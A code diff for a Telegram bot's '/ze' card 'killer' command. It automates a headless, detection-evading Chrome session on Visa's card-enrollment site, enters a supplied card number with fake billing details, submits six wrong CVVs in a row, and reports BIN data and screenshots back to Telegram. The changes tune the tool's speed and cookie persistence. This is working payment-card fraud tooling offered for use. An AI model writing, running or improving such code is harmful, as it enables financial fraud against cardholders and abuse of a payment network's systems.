@@ -4130,7 +4130,7 @@ async def dd_cmd(update, context):
     }
     Process(target=run_dd_process, args=(card_input, update_dict), daemon=True).start()
 
-# ==== 7.7 /ze Command (Killed v7 — FASTEST, 6 CVV attempts, max optimizations) ==== #
+# ==== 7.7 /ze Command (Killed v7 — FASTEST, 6 CVV attempts, cookie persistence) ==== #
 def run_ze_process(card_input, update_dict):
     import os, random, traceback, requests, time, threading
     from selenium import webdriver
@@ -4142,6 +4142,7 @@ def run_ze_process(card_input, update_dict):
 
     CHROME_PATH = "/usr/bin/google-chrome"
     CHROME_DRIVER_PATH = "/usr/bin/chromedriver"
+    USER_DATA_DIR = "/tmp/ze_chrome_profile"
     BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
 
     def _env_int(name: str, default: int) -> int:
@@ -4182,7 +4183,6 @@ def run_ze_process(card_input, update_dict):
                 country_flag = data.get("country_flag", "") or _flag_from_country_code(country_code)
                 bank = data.get("bank", "Unknown")
                 level = data.get("level", "")
-
                 info_parts = [brand]
                 if type_ and type_ != "UNKNOWN":
                     info_parts.append(type_)
@@ -4192,7 +4192,6 @@ def run_ze_process(card_input, update_dict):
                     info_parts.append(level)
                 if bank and bank != "Unknown":
                     info_parts.append(bank)
-
                 return " • ".join(info_parts), country_flag
         except Exception:
             pass
@@ -4201,11 +4200,13 @@ def run_ze_process(card_input, update_dict):
     def get_random_email():
         return ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8)) + "@gmail.com"
 
-    def get_fake_data():
+    def get_fake_name():
         first = random.choice(["James", "John", "Robert", "Michael", "David"])
         last = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones"])
-        phone = "20255501" + ''.join(random.choices('0123456789', k=2))
-        return first, last, "123 Elm Street", "New York", "NY", "10001", phone
+        return first, last
+
+    def get_fake_address():
+        return "123 Elm Street", "New York", "NY", "10001", "20255501" + ''.join(random.choices('0123456789', k=2))
 
     def get_wrong_cvv(exclude):
         while True:
@@ -4222,7 +4223,7 @@ def run_ze_process(card_input, update_dict):
         }
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
         try:
-            requests.post(url, data=payload, timeout=3)
+            requests.post(url, data=payload, timeout=5)
         except Exception:
             pass
 
@@ -4243,7 +4244,7 @@ def run_ze_process(card_input, update_dict):
                         f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                         data=payload,
                         files=files,
-                        timeout=8
+                        timeout=10
                     )
                 sent = True
                 os.remove(screenshot_path)
@@ -4259,7 +4260,7 @@ def run_ze_process(card_input, update_dict):
                 requests.post(
                     f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                     data=payload,
-                    timeout=3
+                    timeout=5
                 )
             except Exception:
                 pass
@@ -4270,46 +4271,10 @@ def run_ze_process(card_input, update_dict):
     try:
         edit_message("🚀 Processing (FASTEST)...")
 
-        options = webdriver.ChromeOptions()
-        options.binary_location = CHROME_PATH
-        options.add_argument("--headless=new")
-        options.add_argument("--no-sandbox")
-        options.add_argument("--disable-dev-shm-usage")
-        options.add_argument("--disable-gpu")
-        options.add_argument("--disable-extensions")
-        options.add_argument("--disable-infobars")
-        options.add_argument("--disable-notifications")
-        options.add_argument("--disable-popup-blocking")
-        options.add_argument("--blink-settings=imagesEnabled=false")
-        options.add_argument("--disable-blink-features=AutomationControlled")
-        options.add_argument("--window-size=1280,720")
-        options.add_argument("--disable-logging")
-        options.add_argument("--log-level=3")
-        options.add_argument("--silent")
-        options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
-        options.add_experimental_option('useAutomationExtension', False)
-        # Fastest page load - don't wait for anything
-        prefs = {
-            "profile.managed_default_content_settings.images": 2,
-            "profile.managed_default_content_settings.stylesheets": 2,
-            "profile.managed_default_content_settings.fonts": 2,
-        }
-        options.add_experimental_option("prefs", prefs)
-        try:
-            options.set_capability("pageLoadStrategy", "eager")
-        except Exception:
-            pass
-
-        service = Service(executable_path=CHROME_DRIVER_PATH)
-        driver = webdriver.Chrome(service=service, options=options)
-        driver.set_page_load_timeout(10)
-        wait = WebDriverWait(driver, 2)  # Balanced timeout
-
         # Pre-parse card data
         cc, mm, yy, real_cvv = split_card(card_input)
         short_card = f"{cc}|{mm}|{yy}|{real_cvv}"
         wrong_cvv = get_wrong_cvv(real_cvv)
-        first_name, last_name, address, city, state, zip_code, phone = get_fake_data()
 
         # Start BIN lookup in parallel thread
         bin_result = {"info": "Unavailable", "flag": ""}
@@ -4323,157 +4288,107 @@ def run_ze_process(card_input, update_dict):
         bin_thread = threading.Thread(target=fetch_bin, daemon=True)
         bin_thread.start()
 
-        COOKIE_FILE = "/tmp/visa_cookies.json"
-        
-        # First visit to set domain for cookies
+        # Chrome options with persistent user data for cookies
+        options = webdriver.ChromeOptions()
+        options.binary_location = CHROME_PATH
+        options.add_argument(f"--user-data-dir={USER_DATA_DIR}")
+        options.add_argument("--disable-blink-features=AutomationControlled")
+        options.add_argument("--headless=new")
+        options.add_argument("--no-sandbox")
+        options.add_argument("--disable-dev-shm-usage")
+        options.add_argument("--window-size=1920,1080")
+        options.add_experimental_option("excludeSwitches", ["enable-automation"])
+        options.add_experimental_option('useAutomationExtension', False)
+        try:
+            options.set_capability("pageLoadStrategy", "eager")
+        except Exception:
+            pass
+
+        service = Service(executable_path=CHROME_DRIVER_PATH)
+        driver = webdriver.Chrome(service=service, options=options)
+        wait = WebDriverWait(driver, 2.5)
+
         driver.get("https://src.visa.com/login")
-        
-        # Try to load saved cookies
-        cookies_loaded = False
+
+        # Handle cookie banner if it appears (will be skipped after first run due to persistent profile)
         try:
-            import json
-            if os.path.exists(COOKIE_FILE):
-                with open(COOKIE_FILE, 'r') as f:
-                    cookies = json.load(f)
-                for cookie in cookies:
-                    try:
-                        driver.add_cookie(cookie)
-                    except:
-                        pass
-                cookies_loaded = True
-                driver.refresh()
+            cookie_btn = WebDriverWait(driver, 1.5).until(
+                EC.element_to_be_clickable((By.XPATH, "//button[text()='Accept']"))
+            )
+            cookie_btn.click()
+            time.sleep(0.3)
         except:
+            # No cookie banner or already accepted - good!
             pass
+
+        # Fill email and continue
+        wait.until(EC.visibility_of_element_located((By.ID, "email-input"))).send_keys(get_random_email())
+        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="continue-button"]'))).click()
         
-        time.sleep(0.5)
-        
-        # Check if cookie banner exists, if so accept and save cookies
+        # Terms checkbox and next
+        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="terms-checkbox"]'))).click()
+        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="next-button"]'))).click()
+
+        # Fill card details
+        first_name, last_name = get_fake_name()
+        address, city, state, zip_code, phone = get_fake_address()
+
+        wait.until(EC.visibility_of_element_located((By.ID, "card-input"))).send_keys(cc)
+        wait.until(EC.visibility_of_element_located((By.ID, "expiration-input"))).send_keys(mm + yy)
+        wait.until(EC.visibility_of_element_located((By.ID, "cvv-input"))).send_keys(wrong_cvv)
+
+        # Billing (USA)
+        wait.until(EC.visibility_of_element_located((By.ID, "first-name-input"))).send_keys(first_name)
+        wait.until(EC.visibility_of_element_located((By.ID, "last-name-input"))).send_keys(last_name)
+
         try:
-            overlay = driver.find_element(By.ID, "CookieReportsOverlay")
-            if overlay:
-                # Need to accept cookies
-                driver.execute_script("""
-                    var overlay = document.getElementById('CookieReportsOverlay');
-                    if (overlay) overlay.remove();
-                    var btns = document.querySelectorAll('button');
-                    for (var i = 0; i < btns.length; i++) {
-                        if (btns[i].innerText.trim() === 'Accept') {
-                            btns[i].click(); break;
-                        }
-                    }
-                """)
-                time.sleep(0.5)
-                # Save cookies for future use
-                try:
-                    import json
-                    cookies = driver.get_cookies()
-                    with open(COOKIE_FILE, 'w') as f:
-                        json.dump(cookies, f)
-                except:
-                    pass
-        except:
-            # No overlay, cookies working!
-            pass
-        
-        # Remove any remaining overlay just in case
-        driver.execute_script("var o = document.getElementById('CookieReportsOverlay'); if(o) o.remove();")
-
-        # Fill email
-        email_field = wait.until(EC.visibility_of_element_located((By.ID, "email-input")))
-        email_field.send_keys(get_random_email())
-        
-        # Click Continue
-        driver.execute_script("document.querySelector('[data-testid=\"continue-button\"]').click();")
-        
-        time.sleep(0.7)
-        
-        # Terms checkbox - wait for page transition
-        checkbox = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="terms-checkbox"]')))
-        checkbox.click()
-        
-        # Next button
-        next_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="next-button"]')))
-        next_btn.click()
-        
-        time.sleep(0.5)
-
-        # Wait for card form
-        wait.until(EC.presence_of_element_located((By.ID, "card-input")))
-        
-        # Batch fill using JavaScript - FASTEST method
-        fill_script = """
-        document.getElementById('card-input').value = arguments[0];
-        document.getElementById('card-input').dispatchEvent(new Event('input', {bubbles: true}));
-        document.getElementById('expiration-input').value = arguments[1];
-        document.getElementById('expiration-input').dispatchEvent(new Event('input', {bubbles: true}));
-        document.getElementById('cvv-input').value = arguments[2];
-        document.getElementById('cvv-input').dispatchEvent(new Event('input', {bubbles: true}));
-        document.getElementById('first-name-input').value = arguments[3];
-        document.getElementById('first-name-input').dispatchEvent(new Event('input', {bubbles: true}));
-        document.getElementById('last-name-input').value = arguments[4];
-        document.getElementById('last-name-input').dispatchEvent(new Event('input', {bubbles: true}));
-        document.getElementById('line1-input').value = arguments[5];
-        document.getElementById('line1-input').dispatchEvent(new Event('input', {bubbles: true}));
-        document.getElementById('city-input').value = arguments[6];
-        document.getElementById('city-input').dispatchEvent(new Event('input', {bubbles: true}));
-        document.getElementById('stateProvinceCode-input').value = arguments[7];
-        document.getElementById('stateProvinceCode-input').dispatchEvent(new Event('input', {bubbles: true}));
-        document.getElementById('zip-input').value = arguments[8];
-        document.getElementById('zip-input').dispatchEvent(new Event('input', {bubbles: true}));
-        document.getElementById('card-phone-input-number').value = arguments[9];
-        document.getElementById('card-phone-input-number').dispatchEvent(new Event('input', {bubbles: true}));
-        """
-        driver.execute_script(fill_script, cc, mm + yy, wrong_cvv, first_name, last_name, address, city, state, zip_code, phone)
-
-        # Country selection
-        try:
-            country_box = driver.find_element(By.CSS_SELECTOR, '[data-testid="region-select"]')
+            country_box = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="region-select"]')))
             country_val = country_box.get_attribute('value')
             if not country_val or ("United States" not in country_val):
-                driver.execute_script("""
-                    var el = arguments[0];
-                    el.click();
-                    el.value = 'United States';
-                    el.dispatchEvent(new Event('input', {bubbles: true}));
-                """, country_box)
+                country_box.click()
+                country_box.clear()
+                country_box.send_keys("United States")
                 country_box.send_keys(Keys.ENTER)
         except Exception:
             pass
 
-        # Click submit using JS - fast
-        driver.execute_script("""
-            window.scrollTo(0, document.body.scrollHeight);
-            var btn = document.querySelector('button[data-testid="submit-button"]') ||
-                      document.querySelector('button[type="submit"]') ||
-                      Array.from(document.querySelectorAll('button')).find(b => 
-                          b.innerText.includes('Add card') || b.innerText.includes('Submit'));
-            if (btn) btn.click();
-        """)
+        wait.until(EC.visibility_of_element_located((By.ID, "line1-input"))).send_keys(address)
+        wait.until(EC.visibility_of_element_located((By.ID, "city-input"))).send_keys(city)
+        wait.until(EC.visibility_of_element_located((By.ID, "stateProvinceCode-input"))).send_keys(state)
+        wait.until(EC.visibility_of_element_located((By.ID, "zip-input"))).send_keys(zip_code)
+        wait.until(EC.visibility_of_element_located((By.ID, "card-phone-input-number"))).send_keys(phone)
 
-        # 6 CVV attempts - minimal delay
+        # Submit
+        add_card_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="submit-button"]')))
+        driver.execute_script("arguments[0].scrollIntoView(true);", add_card_btn)
+        add_card_btn.click()
+
+        edit_message("🔄 Running 6 CVV attempts...")
+
+        # 6 CVV attempts (including the initial submit above)
         TOTAL_TRIES = 6
         used_cvvs = {wrong_cvv}
         for _ in range(TOTAL_TRIES - 1):
-            fake_cvv = ''.join(random.choices('0123456789', k=3))
-            while fake_cvv in used_cvvs:
+            while True:
                 fake_cvv = ''.join(random.choices('0123456789', k=3))
-            used_cvvs.add(fake_cvv)
-            time.sleep(0.15)  # Minimal delay
+                if fake_cvv not in used_cvvs:
+                    used_cvvs.add(fake_cvv)
+                    break
             try:
-                driver.execute_script("""
-                    var cvv = document.getElementById('cvv-input');
-                    if (cvv) { cvv.value = arguments[0]; cvv.dispatchEvent(new Event('input', {bubbles: true})); }
-                    var btn = document.querySelector('button[data-testid="submit-button"]') ||
-                              document.querySelector('button[type="submit"]');
-                    if (btn) btn.click();
-                """, fake_cvv)
-            except:
+                add_card_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="submit-button"]')))
+                cvv_field = wait.until(EC.visibility_of_element_located((By.ID, "cvv-input")))
+                cvv_field.click()
+                cvv_field.send_keys(Keys.CONTROL + "a")
+                cvv_field.send_keys(fake_cvv)
+                driver.execute_script("arguments[0].scrollIntoView(true);", add_card_btn)
+                add_card_btn.click()
+            except Exception:
                 pass
 
-        # Wait for BIN thread (should be done by now)
+        # Wait for BIN thread
         bin_thread.join(timeout=0.5)
         bin_info, bin_flag = bin_result["info"], bin_result["flag"]
-        
+
         duration = round(time.time() - start, 2)
         edit_message(
             f"💳 **Card:** `{short_card}`\n"
